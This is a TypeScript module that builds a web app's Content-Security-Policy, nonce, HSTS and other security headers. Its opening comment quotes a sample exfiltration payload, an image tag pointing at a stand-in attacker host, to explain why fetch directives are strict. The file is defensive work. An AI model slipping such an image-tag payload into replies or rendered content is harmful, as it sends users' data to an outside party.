/**
 * Content-Security-Policy, built per request by proxy.ts. The app loads nothing from other
 * origins (local fonts, no remote images, fetches to its own API only), so the fetch directives
 * are strict: a model reply or Jira text that slips an `<img src="https://attacker/?d=…">` past
 * the renderer still cannot make the browser send data anywhere. `'self'` also covers the dev
 * server's HMR websocket.
 *
 * Scripts need the request's nonce, which Next reads back from this header and puts on its own
 * scripts; `'strict-dynamic'` lets those load the page's chunks (mermaid, shiki…). Shiki compiles
 * its WebAssembly regex engine, hence `'wasm-unsafe-eval'`; React needs `eval` in development
 * only. Inline styles stay allowed: charts, mermaid and the UI kit set them at runtime (a nonce
 * here would make browsers ignore `'unsafe-inline'`).
 */
export function contentSecurityPolicy({ nonce, dev }: { nonce: string; dev: boolean }): string {
  return [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic' 'wasm-unsafe-eval'${dev ? " 'unsafe-eval'" : ''}`,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob:",
    // blob: lets the chat input read a file the user picked; nothing leaves for another origin.
    "connect-src 'self' blob:",
    "font-src 'self' data:",
    "media-src 'self'",
    "worker-src 'self' blob:",
    "frame-src 'none'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
  ].join('; ');
}

/** A fresh, unguessable nonce for one response. */
export function createNonce(): string {
  const bytes = crypto.getRandomValues(new Uint8Array(16));
  return btoa(String.fromCharCode(...bytes));
}

/** HSTS, only when the app is served over https (BETTER_AUTH_URL is its public address). */
export function strictTransportSecurity(publicUrl: string | undefined): string | null {
  return publicUrl?.startsWith('https://') ? 'max-age=31536000; includeSubDomains' : null;
}

/** Headers that do not depend on the request, for `next.config` `headers()`. */
export function securityHeaders() {
  return [
    {
      source: '/:path*',
      headers: [
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        {
          key: 'Permissions-Policy',
          value: 'camera=(), microphone=(), geolocation=(), payment=(), usb=(), browsing-topics=()',
        },
      ],
    },
  ];
}
